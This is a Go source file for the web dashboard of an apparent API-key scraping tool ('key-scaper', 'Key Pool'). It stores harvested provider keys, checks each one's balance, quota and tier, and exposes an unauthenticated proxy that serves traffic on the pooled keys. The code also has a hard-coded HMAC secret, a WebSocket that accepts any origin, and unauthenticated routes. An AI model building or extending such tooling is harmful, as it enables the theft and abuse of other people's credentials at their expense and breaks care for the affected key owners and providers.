                keyStore.UpdateKey(k.ID, "valid", vr.Balance, vr.Quota, vr.Tier, vr.KeyType, vr.Org, vr.Models, vr.Details)
                if wsHub != nil {
                        wsHub.Broadcast("keyUpdate", map[string]interface{}{
                                "id":      k.ID,
                                "status":  "valid",
                                "balance": vr.Balance,
                        })
                }
        }
}

// ─── Dashboard Auth ────────────────────────────────────────────────────────

func computeSessionToken(password string) string {
        mac := hmac.New(sha256.New, []byte("key-scaper-secret"))
        mac.Write([]byte(password))
        return hex.EncodeToString(mac.Sum(nil))
}

func checkAuth(r *http.Request) bool {
        cookie, err := r.Cookie("session")
        if err != nil {
                return false
        }
        expected := computeSessionToken(appSettings.DashboardPassword)
        return hmac.Equal([]byte(cookie.Value), []byte(expected))
}

func requireAuth(next http.HandlerFunc) http.HandlerFunc {
        return func(w http.ResponseWriter, r *http.Request) {
                if !checkAuth(r) {
                        http.Error(w, "Unauthorized", http.StatusUnauthorized)
                        return
                }
                next(w, r)
        }
}

// ─── Embedded Dashboard HTML ────────────────────────────────────────────────
// dashboardHTML is defined in dashboard_html.go (separate file, same package)

// ─── HTTP Handlers ──────────────────────────────────────────────────────────

var (
        dashboard         *DashboardState
        wsHub             *WSHub
        dashboardHTMLBytes []byte
)

func init() {
        dashboardHTMLBytes = []byte(dashboardHTML)
}

var wsUpgrader = websocket.Upgrader{
        ReadBufferSize:  1024,
        WriteBufferSize: 1024,
        CheckOrigin: func(r *http.Request) bool {
                return true // Allow all origins for now
        },
}

func handleDashboard(w http.ResponseWriter, r *http.Request) {
        if r.URL.Path != "/" {
                // Check if it's a login page
                if r.URL.Path == "/login" {
                        w.Header().Set("Content-Type", "text/html; charset=utf-8")
                        w.Write([]byte(loginHTML))
                        return
                }
                http.NotFound(w, r)
                return
        }
        // Check auth
        if !checkAuth(r) {
                http.Redirect(w, r, "/login", http.StatusFound)
                return
        }
        w.Header().Set("Content-Type", "text/html; charset=utf-8")
        w.Write(dashboardHTMLBytes)
}

func handleLogin(w http.ResponseWriter, r *http.Request) {
        if r.Method != "POST" {
                http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
                return
        }
        var body struct {
                Password string `json:"password"`
        }
        if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
                http.Error(w, "Invalid request", http.StatusBadRequest)
                return
        }
        if body.Password != appSettings.DashboardPassword {
                http.Error(w, "Invalid password", http.StatusUnauthorized)
                return
        }
        // Set session cookie
        token := computeSessionToken(appSettings.DashboardPassword)
        http.SetCookie(w, &http.Cookie{
                Name:     "session",
                Value:    token,
                Path:     "/",
                HttpOnly: true,
                MaxAge:   86400 * 30, // 30 days
                SameSite: http.SameSiteLaxMode,
        })
        w.WriteHeader(http.StatusOK)
        json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

func handleGetKeys(w http.ResponseWriter, r *http.Request) {
        provider := r.URL.Query().Get("provider")
        var keys []KeyEntry
        if provider != "" {
                keys = keyStore.GetProviderKeys(provider)
        } else {
                keys = keyStore.GetAllKeys()
        }
        w.Header().Set("Content-Type", "application/json")
        json.NewEncoder(w).Encode(keys)
}

func handleGetKey(w http.ResponseWriter, r *http.Request) {
        idStr := strings.TrimPrefix(r.URL.Path, "/api/keys/")
        id, err := strconv.Atoi(idStr)
        if err != nil {
                http.Error(w, "Invalid key ID", http.StatusBadRequest)
                return
        }
        k := keyStore.GetKeyByID(id)
        if k == nil {
                http.Error(w, "Key not found", http.StatusNotFound)
                return
        }
        w.Header().Set("Content-Type", "application/json")
        json.NewEncoder(w).Encode(k)
}

func handleDeleteKey(w http.ResponseWriter, r *http.Request) {
        idStr := strings.TrimPrefix(r.URL.Path, "/api/keys/")
        id, err := strconv.Atoi(idStr)
        if err != nil {
                http.Error(w, "Invalid key ID", http.StatusBadRequest)
                return
        }
        keyStore.DeleteKey(id)
        w.WriteHeader(http.StatusNoContent)
}

type AddKeyRequest struct {
        Provider string `json:"provider"`
        Key      string `json:"key"`
}

func handleAddKey(w http.ResponseWriter, r *http.Request) {
        var req AddKeyRequest
        if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
                http.Error(w, "Invalid request body", http.StatusBadRequest)
                return
        }
        req.Provider = strings.ToLower(strings.TrimSpace(req.Provider))
        req.Key = strings.TrimSpace(req.Key)
        if req.Provider == "" || req.Key == "" {
                http.Error(w, "provider and key are required", http.StatusBadRequest)
                return
        }

        // Check provider is known
        if _, ok := providerConfigs[req.Provider]; !ok {
                http.Error(w, fmt.Sprintf("Unknown provider: %s", req.Provider), http.StatusBadRequest)
                return
        }

        // Check for duplicate
        existing := keyStore.GetKeyByValue(req.Key)
        if existing != nil {
                http.Error(w, "Key already exists", http.StatusConflict)
                return
        }

        // Add key as unchecked, then verify in background
        entry := keyStore.AddKey(req.Provider, req.Key, "manual", "")

        w.Header().Set("Content-Type", "application/json")
        json.NewEncoder(w).Encode(entry)

        // Verify in background
        go func() {
                var cfg Config
                cfg.VerifyTimeout = 15
                validateSingleKey(entry.ID, cfg)
        }()
}

func handleRecheckKey(w http.ResponseWriter, r *http.Request) {
        idStr := strings.TrimPrefix(r.URL.Path, "/api/keys/")
        idStr = strings.TrimSuffix(idStr, "/recheck")
        id, err := strconv.Atoi(idStr)
        if err != nil {
                http.Error(w, "Invalid key ID", http.StatusBadRequest)
                return
        }
        // Run recheck in background
        go func() {
                var cfg Config
                cfg.VerifyTimeout = 15
                validateSingleKey(id, cfg)
        }()
        w.WriteHeader(http.StatusAccepted)
        json.NewEncoder(w).Encode(map[string]string{"status": "rechecking"})
}

func handleStats(w http.ResponseWriter, r *http.Request) {
        // Combine dashboard state + keystore stats
        snap := dashboard.GetSnapshot()
        ksStats := keyStore.GetStats()

        result := map[string]interface{}{
                "totalFound":       snap.TotalFound,
                "totalScanned":     snap.TotalScanned,
                "totalRawHits":     snap.TotalRawHits,
                "totalValid":       snap.TotalValid,
                "totalInvalid":     snap.TotalInvalid,
                "totalWebhookOK":   snap.TotalWebhookOK,
                "totalWebhookFail": snap.TotalWebhookFail,
                "tokenCount":       snap.TokenCount,
                "rateLimitRemain":  snap.RateLimitRemain,
                "rateLimitLimit":   snap.RateLimitLimit,
                "status":           snap.Status,
                "uptime":           snap.Uptime,
                "keyStore":         ksStats,
        }

        w.Header().Set("Content-Type", "application/json")
        json.NewEncoder(w).Encode(result)
}

func handleProviders(w http.ResponseWriter, r *http.Request) {
        providers := keyStore.GetAllProviders()
        result := make([]map[string]interface{}, 0, len(providers))
        for _, p := range providers {
                keys := keyStore.GetProviderKeys(p)
                valid := 0
                for _, k := range keys {
                        if k.Status == "valid" {
                                valid++
                        }
                }
                result = append(result, map[string]interface{}{
                        "provider": p,
                        "total":    len(keys),
                        "valid":    valid,
                })
        }
        w.Header().Set("Content-Type", "application/json")
        json.NewEncoder(w).Encode(result)
}

func handleGetSettings(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Content-Type", "application/json")
        // Don't expose the actual password, just whether it's set
        safe := appSettings
        if safe.DashboardPassword != "" {
                safe.DashboardPassword = "***"
        }
        json.NewEncoder(w).Encode(safe)
}

func handleUpdateSettings(w http.ResponseWriter, r *http.Request) {
        var newSettings AppSettings
        if err := json.NewDecoder(r.Body).Decode(&newSettings); err != nil {
                http.Error(w, "Invalid request", http.StatusBadRequest)
                return
        }
        // Update only allowed fields
        appSettings.AutoValidate = newSettings.AutoValidate
        appSettings.ValidateInterval = newSettings.ValidateInterval
        appSettings.DiscordEnabled = newSettings.DiscordEnabled
        appSettings.ProxyEnabled = newSettings.ProxyEnabled
        if newSettings.DashboardPassword != "" && newSettings.DashboardPassword != "***" {
                appSettings.DashboardPassword = newSettings.DashboardPassword
        }
        w.WriteHeader(http.StatusOK)
        json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

func handleValidateAll(w http.ResponseWriter, r *http.Request) {
        var cfg Config
        cfg.VerifyTimeout = 15
        go validateAllKeys(cfg)
        w.WriteHeader(http.StatusAccepted)
        json.NewEncoder(w).Encode(map[string]string{"status": "validation started"})
}

func handleWebSocket(w http.ResponseWriter, r *http.Request) {
        conn, err := wsUpgrader.Upgrade(w, r, nil)
        if err != nil {
                log.Printf("WebSocket upgrade error: %v", err)
                return
        }
        client := &WSClient{
                hub:  wsHub,
                conn: conn,
                send: make(chan []byte, 256),
        }
        wsHub.Register(client)

        // Send initial stats
        snap := dashboard.GetSnapshot()
        ksStats := keyStore.GetStats()
        initialMsg := map[string]interface{}{
                "type": "stats",
                "data": map[string]interface{}{
                        "dashboard": snap,
                        "keyStore":  ksStats,
                },
        }
        msgBytes, _ := json.Marshal(initialMsg)
        client.send <- msgBytes

        go client.writePump()
        go client.readPump()
}

// ─── Login HTML ──────────────────────────────────────────────────────────────

const loginHTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Key Pool - Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d1117;color:#c9d1d9;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
.login-box{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:40px;width:360px;text-align:center}
.login-box h1{color:#7D56F4;margin-bottom:24px;font-size:24px}
.login-box input{width:100%;padding:12px;border:1px solid #30363d;border-radius:8px;background:#0d1117;color:#c9d1d9;font-size:14px;outline:none;margin-bottom:16px}
.login-box input:focus{border-color:#7D56F4}
.login-box button{width:100%;padding:12px;background:#7D56F4;color:#fff;border:none;border-radius:8px;font-size:14px;cursor:pointer;font-weight:600}
.login-box button:hover{background:#874BFD}
.error{color:#FF5555;font-size:13px;margin-top:12px;display:none}
</style>
</head>
<body>
<div class="login-box">
<h1>Key Pool</h1>
<input type="password" id="password" placeholder="Password" onkeydown="if(event.key==='Enter')login()">
<button onclick="login()">Sign In</button>
<div class="error" id="error">Invalid password</div>
</div>
<script>
function login(){
  const p=document.getElementById('password').value;
  fetch('/auth',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:p})})
  .then(r=>{if(r.ok){window.location.href='/'}else{document.getElementById('error').style.display='block'}})
  .catch(()=>{document.getElementById('error').style.display='block'});
}
</script>
</body>
</html>`

// ─── Dashboard Server ──────────────────────────────────────────────────────

func startDashboardServer(port string) {
        mux := http.NewServeMux()

        // Public routes (no auth)
        mux.HandleFunc("/auth", handleLogin)
        mux.HandleFunc("/api/", func(w http.ResponseWriter, r *http.Request) {
                path := r.URL.Path

                // API proxy routes (no auth required)
                // /api/{provider}/v1/...
                for provider := range providerConfigs {
                        prefix := "/api/" + provider + "/v1/"
                        if strings.HasPrefix(path, prefix) {
                                handleAPIProxy(w, r)
                                return
                        }
                }

                // Authenticated API routes
                switch {
                case path == "/api/keys" && r.Method == "GET":
                        if !checkAuth(r) {
                                http.Error(w, "Unauthorized", http.StatusUnauthorized)
                                return
                        }
                        handleGetKeys(w, r)
                case path == "/api/keys" && r.Method == "POST":
                        if !checkAuth(r) {
                                http.Error(w, "Unauthorized", http.StatusUnauthorized)
                                return
                        }
                        handleAddKey(w, r)
                case strings.HasPrefix(path, "/api/keys/") && strings.HasSuffix(path, "/recheck") && r.Method == "POST":
                        if !checkAuth(r) {
                                http.Error(w, "Unauthorized", http.StatusUnauthorized)
                                return
                        }
                        handleRecheckKey(w, r)
                case strings.HasPrefix(path, "/api/keys/") && r.Method == "GET":
                        if !checkAuth(r) {
                                http.Error(w, "Unauthorized", http.StatusUnauthorized)
                                return
                        }
                        handleGetKey(w, r)
                case strings.HasPrefix(path, "/api/keys/") && r.Method == "DELETE":
                        if !checkAuth(r) {
                                http.Error(w, "Unauthorized", http.StatusUnauthorized)
                                return
                        }
                        handleDeleteKey(w, r)
                case path == "/api/stats":
                        if !checkAuth(r) {
                                http.Error(w, "Unauthorized", http.StatusUnauthorized)
                                return
                        }
                        handleStats(w, r)
                case path == "/api/providers":
                        if !checkAuth(r) {
                                http.Error(w, "Unauthorized", http.StatusUnauthorized)
                                return
                        }
                        handleProviders(w, r)
                case path == "/api/settings" && r.Method == "GET":
                        if !checkAuth(r) {
                                http.Error(w, "Unauthorized", http.StatusUnauthorized)
                                return
                        }
                        handleGetSettings(w, r)
                case path == "/api/settings" && r.Method == "POST":
                        if !checkAuth(r) {
                                http.Error(w, "Unauthorized", http.StatusUnauthorized)
                                return
                        }
                        handleUpdateSettings(w, r)
                case path == "/api/validate-all" && r.Method == "POST":
                        if !checkAuth(r) {
                                http.Error(w, "Unauthorized", http.StatusUnauthorized)
                                return
                        }
                        handleValidateAll(w, r)
                default:
                        http.NotFound(w, r)
                }
        })

        // WebSocket endpoint
        mux.HandleFunc("/ws", handleWebSocket)

        // Dashboard pages
        mux.HandleFunc("/", handleDashboard)
        mux.HandleFunc("/login", func(w http.ResponseWriter, r *http.Request) {
                w.Header().Set("Content-Type", "text/html; charset=utf-8")
                w.Write([]byte(loginHTML))
        })

        log.Printf("Dashboard server starting on port %s", port)
        go func() {
                if err := http.ListenAndServe(":"+port, mux); err != nil {
                        log.Printf("Dashboard server error: %v", err)
                }
        }()
}

// broadcastWSSnapshot sends the current dashboard state to all WebSocket clients
func broadcastWSSnapshot() {
        if wsHub == nil {
                return
        }
        snap := dashboard.GetSnapshot()
        ksStats := keyStore.GetStats()
        wsHub.Broadcast("stats", map[string]interface{}{
                "dashboard": snap,
                "keyStore":  ksStats,
        })
}
